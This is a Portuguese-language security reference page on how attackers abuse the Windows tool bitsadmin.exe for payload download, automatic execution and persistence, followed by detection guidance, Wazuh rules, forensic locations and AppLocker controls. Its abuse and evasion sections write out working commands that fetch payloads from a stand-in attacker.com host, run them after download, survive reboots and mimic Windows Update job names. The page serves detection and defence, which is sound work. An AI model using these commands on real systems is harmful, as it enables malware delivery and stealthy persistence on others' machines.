# bitsadmin.exe

**Plataforma:** Windows (XP em diante — depreciado mas presente)

**Categorias:** Download, Persistência, Bypass de proxy

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer), T1197 (BITS Jobs)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/

---

## O que é o bitsadmin.exe

O bitsadmin.exe é a interface de linha de comando para o Background Intelligent Transfer Service (BITS), um serviço do Windows projetado para transferências de arquivo em background de forma eficiente — priorizando largura de banda disponível, retomando transferências interrompidas e integrando-se ao Windows Update.

Assim como o wmic.exe, o bitsadmin.exe foi depreciado pela Microsoft (a partir do Windows 7) e sua substituição são os cmdlets `Start-BitsTransfer` do PowerShell. No entanto, permanece presente e funcional em todos os sistemas Windows modernos.

---

## Por que atacantes usam o bitsadmin.exe

O BITS tem características que o tornam particularmente atraente para download de payloads e persistência. As transferências BITS são executadas pelo serviço `svchost.exe` como processo filho do serviço BITS — não pelo processo que criou o job. Isso significa que mesmo que o processo que criou o download seja encerrado, a transferência continua. Além disso, jobs BITS sobrevivem a reinicializações do sistema.

Do ponto de vista de rede, as transferências BITS usam HTTP/HTTPS e passam pelo proxy configurado no sistema (via WinINET), o que as faz parecer tráfego legítimo do Windows Update para soluções de inspeção de tráfego não sofisticadas.

---

## Técnicas de abuso

### Download básico de arquivo

```cmd
:: Download básico via BITS
bitsadmin /transfer MeuJob http://attacker.com/payload.exe C:\Users\Public\payload.exe

:: Alternativa com /download flag
bitsadmin /transfer MeuJob /download /priority normal http://attacker.com/payload.exe C:\temp\update.exe

:: Após criação do job, aguardar conclusão
bitsadmin /transfer MeuJob http://attacker.com/payload.exe C:\temp\payload.exe && bitsadmin /complete MeuJob

:: HTTPS
bitsadmin /transfer MeuJob https://attacker.com/payload.exe C:\temp\update.exe
```

### Download com execução automática via notificação

O BITS suporta notificações pós-download: um comando que é executado automaticamente quando o download é concluído. Isso cria um mecanismo de persistência e execução em uma única operação.

```cmd
:: Criar job BITS com execução pós-download
bitsadmin /create MeuJob
bitsadmin /addfile MeuJob http://attacker.com/payload.exe C:\temp\payload.exe
bitsadmin /SetNotifyCmdLine MeuJob C:\temp\payload.exe NUL
bitsadmin /resume MeuJob

:: Versão com cmd.exe intermediário
bitsadmin /create WindowsUpdate
bitsadmin /addfile WindowsUpdate http://attacker.com/payload.exe C:\Windows\Temp\update.exe
bitsadmin /SetNotifyCmdLine WindowsUpdate "cmd.exe" "/c C:\Windows\Temp\update.exe"
bitsadmin /SetNotifyFlags WindowsUpdate 2
bitsadmin /resume WindowsUpdate
```

### Persistência via job BITS

Jobs BITS com a propriedade de notificação configurada persistem no sistema e reexecutam o download e o comando de notificação após reinicializações, até que o job seja completado ou cancelado manualmente.

```cmd
:: Criar job persistente que sobrevive a reinicializações
bitsadmin /create PersistentJob
bitsadmin /addfile PersistentJob http://attacker.com/beacon.exe C:\Windows\Temp\svchost32.exe
bitsadmin /SetNotifyCmdLine PersistentJob "C:\Windows\Temp\svchost32.exe" ""
bitsadmin /SetNotifyFlags PersistentJob 2
bitsadmin /SetMinRetryDelay PersistentJob 60
bitsadmin /resume PersistentJob

:: Listar jobs BITS existentes (para reconhecimento ou cobertura de rastros)
bitsadmin /list /verbose
```

### Download de múltiplos arquivos

```cmd
bitsadmin /create MultiJob
bitsadmin /addfile MultiJob http://attacker.com/tool1.exe C:\temp\tool1.exe
bitsadmin /addfile MultiJob http://attacker.com/tool2.dll C:\temp\tool2.dll
bitsadmin /resume MultiJob
bitsadmin /complete MultiJob
```

---

## Técnicas de bypass e evasão

### Nome de job que imita operações legítimas

```cmd
:: Nomes que imitam jobs do Windows Update
bitsadmin /transfer "Windows Update Client" http://attacker.com/payload.exe C:\temp\p.exe
bitsadmin /create "{7CF5AC36-AAF2-48c7-8ACA-29E20F9C14AC}"
```

### Download via proxy corporativo

O BITS usa automaticamente o proxy configurado no sistema (via `winhttp` ou Internet Explorer), o que significa que o tráfego sai pelo proxy corporativo parecendo tráfego legítimo do sistema:

```cmd
:: O BITS usa o proxy do sistema automaticamente
bitsadmin /transfer MeuJob http://attacker.com/payload.exe C:\temp\p.exe
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- bitsadmin com `/SetNotifyCmdLine` — configuração de execução pós-download
- bitsadmin criando jobs com URL externa em `/addfile`
- Presença de jobs BITS desconhecidos (`bitsadmin /list`) em servidores de produção
- Processo filho do serviço BITS (`svchost.exe` com BITS) executando processos inesperados

**Indicadores de média relevância:**

- bitsadmin com `/create` e nome suspeito ou GUID
- Arquivos baixados pelo BITS em diretórios temporários ou de usuário
- Event ID 16403 no log BITS (job concluído) correlacionado com execução de processo

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0200-lolbas_download.xml -->

<!-- bitsadmin com /transfer para URL externa -->
<rule id="100329" level="13">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)bitsadmin\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(/transfer|/addfile).*https?://</field>
  <description>bitsadmin.exe baixando arquivo de URL externa via BITS</description>
  <mitre>
    <id>T1105</id>
    <id>T1197</id>
  </mitre>
</rule>

<!-- bitsadmin com SetNotifyCmdLine — execução pós-download -->
<rule id="100330" level="14">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)bitsadmin\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)/SetNotifyCmdLine</field>
  <description>bitsadmin.exe configurando execucao automatica pos-download — possivel persistencia via BITS</description>
  <mitre>
    <id>T1197</id>
  </mitre>
</rule>
```

### Artefatos forenses — onde procurar jobs BITS

```cmd
:: Listar todos os jobs BITS ativos e pendentes
bitsadmin /list /verbose

:: Via PowerShell
Get-BitsTransfer -AllUsers | Select-Object JobName, JobState, TransferType, FilesTotal, BytesTransferred
```

Os jobs BITS são armazenados em `%ALLUSERSPROFILE%\Microsoft\Network\Downloader\` em arquivos `qmgr*.dat`. Ferramentas forenses como BitsParser podem extrair histórico de jobs mesmo de arquivos deletados.

### Falsos positivos comuns e como reduzir o ruído

**Windows Update:** o Windows Update usa BITS extensivamente. Os jobs do Windows Update têm nomes e formatos específicos e partem do processo `svchost.exe` com o serviço `wuauserv`. Filtre por origem do job.

**Software de backup e sincronização:** ferramentas como OneDrive, Teams e outros produtos Microsoft usam BITS. Identifique os padrões normais de uso de BITS no ambiente antes de criar regras restritivas.

---

## Proteção e controles defensivos

**Monitorar jobs BITS via WDAC e Wazuh:** implemente monitoramento dos logs BITS (Event ID 3, 59, 60, 61 no canal `Microsoft-Windows-Bits-Client/Operational`) para detectar criação de jobs por usuários não esperados.

**AppLocker para bitsadmin.exe:** em servidores de produção e estações de usuários que não fazem downloads administrativos, bloquear o bitsadmin.exe via AppLocker é seguro — as transferências BITS legítimas (Windows Update) usam a API diretamente, não o bitsadmin.exe.

---

## Referências

- LOLBAS — bitsadmin.exe: https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
- MITRE ATT&CK T1105: https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1197: https://attack.mitre.org/techniques/T1197/
